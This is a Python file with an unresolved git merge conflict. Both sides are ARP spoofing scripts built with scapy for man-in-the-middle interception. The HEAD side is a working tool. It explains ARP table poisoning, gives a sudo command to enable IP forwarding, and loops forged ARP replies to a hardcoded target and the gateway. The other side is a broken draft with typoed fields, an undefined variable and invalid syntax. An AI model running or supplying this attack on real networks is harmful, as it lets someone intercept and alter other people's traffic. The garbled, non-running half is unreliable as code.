<<<<<<< HEAD
'''
MAC spoofing is mainly used to sniff packets being sent between
a host and the default gateway. To change your mac address to look
like a different devices you need to change the ARP table on the host
device. This can be done when a device sends an ARP request for the
default gateway the attacker sends a packet saying that they are the device.
This then tricks the host into sending all packets to the attacker.
Which the attacker can read and manipulate before being sent to the
actual router.

In this script we just send the ARP packets constantly instead
of waiting for a ARP request to be made.

Use this command below to enable packet forwarding.
Otherwise you wont be able to have a internet connection.
sudo sysctl -w net.ipv4.ip_forward=1
'''

from scapy.all import conf, getmacbyip, ARP, send

# Network interface to use
interface = 'wlan0'

# Getting default gateway information
default_gateway_ip = conf.route.route("0.0.0.0")[2]

# Getting device information
device_ip = conf.route.route("0.0.0.0")[1]

# Target infomation
target_ip = '192.168.0.88'

def spoof(destinationIP, sourceIP):
    destinationMAC = getmacbyip(destinationIP)
    packet = ARP(op=2, hwdst=destinationMAC, pdst=destinationIP, psrc=sourceIP)
    send(packet, iface=interface, verbose=False)

def restore(destinationIP, sourceIP):
    destinationMAC = getmacbyip(destinationIP)
    sourceMAC = getmacbyip(sourceIP)
    packet = ARP(op=2, pdst=destinationIP, hwdst=destinationMAC, psrc=sourceIP, hwsrc=sourceMAC)
    send(packet, iface=interface, verbose=False)

try:
    print("Spoofing...")
    while True:
        spoof(target_ip, default_gateway_ip)
        spoof(default_gateway_ip, target_ip)
except KeyboardInterrupt:
    print("Restoring...")
    restore(target_ip, default_gateway_ip)
    restore(default_gateway_ip, target_ip)
=======
import scapy

interface = 'lo'

def spoof(target_ip, spoof_ip):
    # get mac address of target
    packet = scapy.ARP(op=2, hwdst=mac, psdt=target_ip, prsrc=spoof_ip)
    scapy.send(packet, iface=interface, verbose=False)

def restore(dest_ip, source_ip):
    dest_mac = #mac
    src_mac = #mac
    packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=src_mac)
    scapy.send(packet, iface=interface, verbose=False)

# While loop spoofing targets
>>>>>>> 18a8f677b5de81953c81741dae8adeb3944460b5
